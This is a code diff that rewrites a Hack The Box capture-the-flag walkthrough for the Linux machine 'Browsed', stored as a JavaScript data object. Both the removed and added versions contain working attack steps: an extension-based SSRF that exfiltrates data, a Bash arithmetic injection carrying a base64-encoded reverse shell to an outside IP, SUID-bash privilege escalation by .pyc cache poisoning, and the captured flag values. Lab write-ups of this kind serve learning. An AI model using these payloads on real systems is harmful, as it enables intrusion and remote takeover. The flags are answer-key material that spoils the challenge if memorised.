@@ -576,119 +576,117 @@
       ]
     },
     browsed: {
-        title: "HTB: Browsed",
-        badge: "Linux // Medium",
-        icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a0c75262-73b6-45ba-b27f-5d9f048dc5dd.png",
-        os: "Linux",
-        diff: "Medium",
-        diffColor: "var(--neon-cyan)",
-        port: "22, 80",
-        time: "⚠️ 2h 11m",
-        vector: "RustScan → Nmap → Extension Upload → Gitea API Enum → Flask SSRF → Background Service Worker → Bash Arithmetic Injection → Python Bytecode Cache Poisoning → SUID Root Bash",
-        hasFullWriteup: true,
-        nodes: [
-          {
-            phase: "RECONNAISSANCE",
-            title: "Initial Port Scanning & Service Discovery",
-            body: "Fired up rustscan and a thorough nmap scan against the target to identify active listening ports. Found standard OpenSSH on port 22 and an Nginx web server running on port 80.",
-            code: "ip=10.129.244.79\nrustscan -a $ip\nnmap -sCV -p- -oN output.txt $ip"
-          },
-          {
-            phase: "WEB ENUMERATION",
-            title: "Exploring Port 80 & Chrome Extension Portal",
-            body: "Mapping out browsed.htb revealed a web interface dedicated to uploading and previewing custom Chrome extensions. Added target mappings to `/etc/hosts` for proper virtual host resolution.",
-            code: "echo '10.129.244.79  browsedinternals.htb browsed.htb' | sudo tee -a /etc/hosts"
-          },
-          {
-            phase: "DIRECTORY BRUTEFORCE",
-            title: "Feroxbuster Directory & Endpoint Mapping",
-            body: "Ran feroxbuster against the main web application to search for hidden management scripts, asset folders, or upload directories.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_6.05.34_PM.png' alt='Feroxbuster Scan' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "feroxbuster -u http://browsed.htb/"
-          },
-          {
-            phase: "LOG ANALYSIS",
-            title: "Uncovering Internal Virtual Hosts via Logs",
-            body: "Uploaded sample extensions through the interface and reviewed application debug/error output logs. This exposed an internal subdomain (`browsedinternals.htb`).<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_6.24.15_PM.png' alt='Gitea Discovery' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.244.79/ -H \"Host: FUZZ.browsed.htb\" -fc 301 -fs 6708"
-          },
-          {
-            phase: "INTERNAL DISCOVERY",
-            title: "Gitea API Repository Tree Enumeration",
-            body: "The internal domain hosted a self-hosted Gitea instance. Instead of browsing through the web interface manually, I queried the Gitea API directly to recursively pull down the repository structure and source files for `MarkdownPreview`.",
-            code: "curl -s \"http://browsedinternals.htb/api/v1/repos/larry/MarkdownPreview/git/trees/main?recursive=true\" | jq -r '.tree[].path'"
-          },
-          {
-            phase: "SOURCE CODE AUDIT",
-            title: "Analyzing the Internal Flask Application (`app.py`)",
-            body: "Examining `app.py` revealed a Markdown previewer endpoint and a local routine manager (`/routines/<rid>`) that executed system processes via `subprocess.run([\"./routines.sh\", rid])`. Crucially, the app was bound strictly to loopback: `app.run(host='127.0.0.1', port=5000)`.",
-            code: "from flask import Flask, request\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/routines/<rid>')\ndef routines(rid):\n    subprocess.run([\"./routines.sh\", rid])\n    return \"Routine executed !\"\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5000)"
-          },
-          {
-            phase: "⚠️ THE RABBIT HOLES",
-            title: "The Content Script Dead End (30 Min Wasted)",
-            body: "My initial instinct was to build a standard extension content script to read `http://localhost:5000`. Browser CORS policies completely blocked it from interacting with the local DOM or hitting loopback endpoints.<br><br><div style='text-align:center;'><img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2Y4NDl2Znl4NnU0NHFvcGNvZnFwajZoZXQxZmU3cm13bXFtdzZzOCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/xUKTfpLS9BYUT2vprT/giphy.gif' alt='Frustration' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br>"
-          },
-          {
-            phase: "FOOTHOLD SETUP",
-            title: "Browser Extension Architecture & Permissions",
-            body: "Researched Chrome extension core privileges. Content scripts have isolated DOM access, but **Background Service Workers** with explicit `host_permissions` can bridge network boundaries and query internal loopback services without getting blocked by CORS.<br><br><div style='text-align:center;'><img src='Browsed/image.png' alt='image browser' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>"
-          },
-          {
-            phase: "FOOTHOLD SSRF EXECUTION",
-            title: "Configuring Service Worker & Catching Exfiltration",
-            body: "Crafted a malicious extension package containing a `manifest.json` and a `background.js` file. The background worker fetched `http://localhost:5000/`, base64-encoded the response body, and exfiltrated it back to my python listener.",
-            body: "<div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-
-          },
-          {
-            phase: "FOOTHOLD PACKAGING",
-            title: "Zipping and Decoding the Extension Payload",
-            body: "Zipped the exploit files into an extension package, uploaded it to the target platform, and decoded the exfiltrated base64 payload to review the complete application source code.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.19.27_PM.png' alt='Zip Payload Structure' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.20.16_PM.png' alt='Base64 Decoded Output' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "zip -r ../ssrf.zip *\npython3 -m http.server 8000"
-          },
-          {
-            phase: "INITIAL ACCESS",
-            title: "Bash Arithmetic Injection to User Shell",
-            body: "Reviewing `routines.sh` revealed numeric checks using `-eq` (e.g., `if [[ \"$1\" -eq 0 ]]`). Because Bash arithmetic evaluation evaluates array subscripts and command substitutions, I injected a command payload into the routine ID parameter to execute base64-encoded instructions, spawning a clean reverse shell as `larry`.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.29.04_PM.png' alt='Payload Preparation' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.31.57_PM.png' alt='Reverse Shell Connection' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.32.46_PM.png' alt='User Flag Captured' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "fetch('http://127.0.0.1:5000/routines/a[$(base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTQvOTAwMiAwPiYx==|bash)]+100');\nnc -lvnp 9002"
-          },
-          {
-            phase: "PRIVILEGE ESCALATION ENUM",
-            title: "Sudo Enumeration and Helper Script Audit",
-            body: "Ran `sudo -l` post-compromise and discovered permission to execute `/opt/extensiontool/extension_tool.py` as root without a password. Investigating the tool showed it imported helper functions from `extension_utils.py`, and the local `__pycache__` folder was fully writable.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.49.03_PM.png' alt='Sudo Enumeration' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "sudo -l\ncat /opt/extensiontool/extension_tool.py"
-          },
-          {
-            phase: "PRIVILEGE ESCALATION MECHANICS",
-            title: "Dissecting Python Bytecode (.pyc) Cache Poisoning",
-            body: "🔍 **Anatomy of a `.pyc` File:** When Python imports a module, it compiles it into bytecode stored inside a `__pycache__` folder. The file begins with a strict 16-byte header containing:<br>" +
-                 "• **Bytes 0–3:** Magic number (Python version identifier)<br>" +
-                 "• **Bytes 4–7:** Bit field / flags (all zeros for timestamp mode)<br>" +
-                 "• **Bytes 8–11:** Source file modification timestamp (`mtime`)<br>" +
-                 "• **Bytes 12–15:** Source file size<br>" +
-                 "Python checks freshness *strictly* by comparing these header values against the real source file on disk. If the timestamp and size match, it blindly executes the cached bytecode without ever re-verifying the source text!<br><br>" +
-                 "<div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.54.54_PM.png' alt='Bytecode Inspection' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br>" +
-                 "<div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.56.19_PM.png' alt='Cache Verification' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br>" +
-                 "Shoutout to **HardSoftSecurity** and their write-up on Python Cache Poisoning. Following their methodology, I built a custom exploit and spoofing script to forge a valid `.pyc` header matching the exact metadata of the target helper file.",
-            code: "# 1. Create malicious exploit script\necho 'import os; os.system(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\")' > exploit.py\npython3 -m py_compile exploit.py"
-          },
-          {
-            phase: "ROOT COMPROMISE",
-            title: "Triggering the Poisoned Module & Flag Capture",
-            body: "Ran a python poisoning script to inject the correct file size and `mtime` header bytes into the compiled payload. Executed the permitted sudo utility, which loaded the forged bytecode, set the SUID bit on `/tmp/rootbash`, and dropped into a root shell.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_8.18.44_PM.png' alt='Root Shell Execution' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_8.19.27_PM.png' alt='Root Flag Captured' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
-            code: "python3.12 poison3.py\nsudo /opt/extensiontool/extension_tool.py --help\n/tmp/rootbash -p"
-          },
-          {
-            phase: "LESSONS LEARNED",
-            title: "Key Takeaways & Remediation",
-            body: "1) Browser extension background service workers are lethal for bypassing CORS during internal network pivots. 2) Never trust numeric `-eq` comparisons in Bash scripts—they are prime real estate for arithmetic command injection. 3) Writable `__pycache__` folders are a goldmine for Python privilege escalation if you respect the 16-byte bytecode header structure and match the file's modification timestamp."
-          }
-        ],
-        flags: [
-          { name: "User Flag", value: "01c3b409e91d4226633ec89ca1fee4c3" },
-          { name: "Root Flag", value: "74db7be127b01fa460124c1e55453abb" }
-        ]
-      },
+      title: "HTB: Browsed",
+      badge: "Linux // Medium",
+      icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a0c75262-73b6-45ba-b27f-5d9f048dc5dd.png",
+      os: "Linux",
+      diff: "Medium",
+      diffColor: "var(--neon-cyan)",
+      port: "22, 80",
+      time: "⚠️ 2h 11m",
+      vector: "RustScan → Nmap → Extension Upload → Gitea API Enum → Flask SSRF → Background Service Worker → Bash Arithmetic Injection → Python Bytecode Cache Poisoning → SUID Root Bash",
+      hasFullWriteup: true,
+      nodes: [
+        {
+          phase: "RECONNAISSANCE",
+          title: "Initial Port Scanning & Service Discovery",
+          body: "Ran rustscan for a fast initial sweep, then a full nmap pass against all 65535 ports to confirm services. Two ports open: OpenSSH on 22, Nginx on 80 — a standard, low-noise entry surface.",
+          code: "ip=10.129.244.79\nrustscan -a $ip\nnmap -sCV -p- -oN output.txt $ip"
+        },
+        {
+          phase: "WEB ENUMERATION",
+          title: "Exploring Port 80 & Chrome Extension Portal",
+          body: "The root site at browsed.htb turned out to be a portal for uploading and previewing custom Chrome extensions — an unusual attack surface, worth treating as the primary target rather than a side feature. Added the vhost to /etc/hosts before going further.",
+          code: "echo '10.129.244.79  browsedinternals.htb browsed.htb' | sudo tee -a /etc/hosts"
+        },
+        {
+          phase: "DIRECTORY BRUTEFORCE",
+          title: "Feroxbuster Directory & Endpoint Mapping",
+          body: "Ran feroxbuster against the application to map hidden management scripts, asset folders, and upload directories before committing to any one path.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_6.05.34_PM.png' alt='Feroxbuster Scan' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "feroxbuster -u http://browsed.htb/"
+        },
+        {
+          phase: "LOG ANALYSIS",
+          title: "Uncovering Internal Virtual Hosts via Logs",
+          body: "Uploading sample extensions and triggering their processing surfaced application debug/error output — and buried in that output was a reference to an internal subdomain, browsedinternals.htb. Confirmed it with a vhost fuzz.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_6.24.15_PM.png' alt='Gitea Discovery' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.244.79/ -H \"Host: FUZZ.browsed.htb\" -fc 301 -fs 6708"
+        },
+        {
+          phase: "INTERNAL DISCOVERY",
+          title: "Gitea API Repository Tree Enumeration",
+          body: "The internal host was a self-hosted Gitea instance. Rather than browsing the web UI by hand, queried the Gitea API directly to recursively pull the full repo tree for MarkdownPreview — faster, and it leaves a cleaner trail to review later.",
+          code: "curl -s \"http://browsedinternals.htb/api/v1/repos/larry/MarkdownPreview/git/trees/main?recursive=true\" | jq -r '.tree[].path'"
+        },
+        {
+          phase: "SOURCE CODE AUDIT",
+          title: "Analyzing the Internal Flask Application (app.py)",
+          body: "app.py exposed a Markdown previewer and a local routine manager at /routines/&lt;rid&gt;, which shelled out via subprocess.run([\"./routines.sh\", rid]). The app was bound strictly to loopback (127.0.0.1:5000) — so direct access needed a pivot, not just a route.",
+          code: "from flask import Flask, request\nimport subprocess\n\napp = Flask(__name__)\n\n@app.route('/routines/<rid>')\ndef routines(rid):\n    subprocess.run([\"./routines.sh\", rid])\n    return \"Routine executed !\"\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5000)"
+        },
+        {
+          phase: "⚠️ DEAD END",
+          title: "The Content Script Rabbit Hole (~30 Min Lost)",
+          body: "First instinct: a standard extension content script reading http://localhost:5000. Browser CORS killed it immediately — content scripts can't reach loopback services from the page context. Noted for next time: check host_permissions scope before building the payload, not after.<br><br><div style='text-align:center;'><img src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2Y4NDl2Znl4NnU0NHFvcGNvZnFwajZoZXQxZmU3cm13bXFtdzZzOCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/xUKTfpLS9BYUT2vprT/giphy.gif' alt='Frustration' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>"
+        },
+        {
+          phase: "FOOTHOLD SETUP",
+          title: "Browser Extension Architecture & Permissions",
+          body: "Background Service Workers run outside the page's CORS context and, with explicit host_permissions, can reach loopback services that content scripts can't touch. That's the bridge: build the SSRF primitive as a background worker, not a content script.<br><br><div style='text-align:center;'><img src='Browsed/image.png' alt='image browser' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>"
+        },
+        {
+          phase: "FOOTHOLD SSRF EXECUTION",
+          title: "Configuring Service Worker & Catching Exfiltration",
+          body: "Built a malicious extension (manifest.json + background.js). On load, the background worker fetches http://localhost:5000/, base64-encodes the response body, and exfiltrates it to a local Python listener — fully bypassing the loopback restriction and CORS in one shot.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.18.57_PM.png' alt='SSRF Listener' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>"
+        },
+        {
+          phase: "FOOTHOLD PACKAGING",
+          title: "Zipping and Decoding the Extension Payload",
+          body: "Zipped the exploit files into an installable extension, uploaded it through the target's preview portal, and decoded the exfiltrated base64 payload to recover the full application source.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.19.27_PM.png' alt='Zip Payload Structure' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.20.16_PM.png' alt='Base64 Decoded Output' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "zip -r ../ssrf.zip *\npython3 -m http.server 8000"
+        },
+        {
+          phase: "INITIAL ACCESS",
+          title: "Bash Arithmetic Injection to User Shell",
+          body: "routines.sh used -eq for numeric checks (e.g. if [[ \"$1\" -eq 0 ]]). Bash arithmetic context evaluates array subscripts and command substitutions, so a crafted routine ID smuggled a base64-encoded command through the comparison — landing a clean reverse shell as larry.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.29.04_PM.png' alt='Payload Preparation' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.31.57_PM.png' alt='Reverse Shell Connection' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.32.46_PM.png' alt='User Flag Captured' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "fetch('http://127.0.0.1:5000/routines/a[$(base64 -d <<< YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTQvOTAwMiAwPiYx==|bash)]+100');\nnc -lvnp 9002"
+        },
+        {
+          phase: "PRIVESC ENUM",
+          title: "Sudo Enumeration and Helper Script Audit",
+          body: "sudo -l showed passwordless root execution of /opt/extensiontool/extension_tool.py. It imports helper functions from extension_utils.py — and the local __pycache__ directory was world-writable. That combination is the whole privesc in one line.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.49.03_PM.png' alt='Sudo Enumeration' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "sudo -l\ncat /opt/extensiontool/extension_tool.py"
+        },
+        {
+          phase: "PRIVESC MECHANICS",
+          title: "Dissecting Python Bytecode (.pyc) Cache Poisoning",
+          body: `Anatomy of a .pyc file: when Python imports a module, it compiles it to bytecode and caches it under __pycache__. The file opens with a strict 16-byte header:
+          <br>• Bytes 0–3: magic number (interpreter version)
+          <br>• Bytes 4–7: bit field / flags (zero in timestamp mode)
+          <br>• Bytes 8–11: source file mtime
+          <br>• Bytes 12–15: source file size
+          <br><br>Python trusts that header. If mtime and size match the real source file on disk, it executes the cached bytecode without re-reading or re-verifying the source. A writable __pycache__ means you control what "cached" code actually runs.
+          <br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.54.54_PM.png' alt='Bytecode Inspection' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>
+          <br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_7.56.19_PM.png' alt='Cache Verification' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>
+          <br>Credit to HardSoftSecurity's write-up on Python cache poisoning — followed their methodology to forge a .pyc header matching the real helper file's exact mtime and size.`,
+          code: "# 1. Create malicious exploit script\necho 'import os; os.system(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\")' > exploit.py\npython3 -m py_compile exploit.py"
+        },
+        {
+          phase: "ROOT COMPROMISE",
+          title: "Triggering the Poisoned Module & Flag Capture",
+          body: "Ran the poisoning script to stamp the forged payload with the real helper's size and mtime, then triggered the permitted sudo utility. It loaded the forged bytecode, set the SUID bit on /tmp/rootbash, and dropped into a root shell.<br><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_8.18.44_PM.png' alt='Root Shell Execution' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div><br><div style='text-align:center;'><img src='Browsed/Screenshot_1448-05-17_at_8.19.27_PM.png' alt='Root Flag Captured' style='max-width:100%; height:auto; border-radius:10px; margin:12px 0; border:1px solid rgba(168,85,247,0.2);'></div>",
+          code: "python3.12 poison3.py\nsudo /opt/extensiontool/extension_tool.py --help\n/tmp/rootbash -p"
+        },
+        {
+          phase: "LESSONS LEARNED",
+          title: "Key Takeaways & Remediation",
+          body: "1) Background service workers sidestep CORS for internal pivoting — treat extension upload portals as first-class attack surface, not a toy feature. 2) Never trust -eq in Bash against untrusted input; it's a direct line into command substitution. 3) A writable __pycache__ is a de facto RCE primitive — match the 16-byte header (magic, mtime, size) and the interpreter will run your code without question."
+        }
+      ],
+      flags: [
+        { name: "User Flag", value: "01c3b409e91d4226633ec89ca1fee4c3" },
+        { name: "Root Flag", value: "74db7be127b01fa460124c1e55453abb" }
+      ]
+    },
       apt: {
       title: "HTB: APT",
       badge: "Windows // Insane",
